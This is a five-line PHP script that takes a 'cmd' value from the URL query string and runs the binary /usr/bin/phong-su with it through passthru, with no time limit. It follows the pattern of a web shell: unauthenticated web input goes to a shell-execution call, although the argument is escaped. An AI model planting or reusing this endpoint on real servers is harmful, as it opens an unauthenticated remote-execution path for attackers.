<?php
set_time_limit (0);
$cmd = $_GET['cmd'];
passthru ("/usr/bin/phong-su ".escapeshellarg($cmd));
?>
